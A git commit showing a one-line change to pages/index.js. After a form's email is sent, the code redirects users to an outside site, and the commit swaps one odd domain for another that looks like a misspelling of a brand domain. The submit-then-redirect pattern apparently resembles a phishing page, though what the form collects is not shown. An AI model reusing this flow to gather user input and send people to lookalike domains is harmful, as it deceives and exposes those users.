334cecf57d313cb03c448a01bcd5ba4e1b456049
husknet <127146284+husknet@users.noreply.github.com>
2025-01-06 13:57:53 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ne.cinco-austra.pro/';
+        window.location.href = 'https://nelo.biggreeneegg.com/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
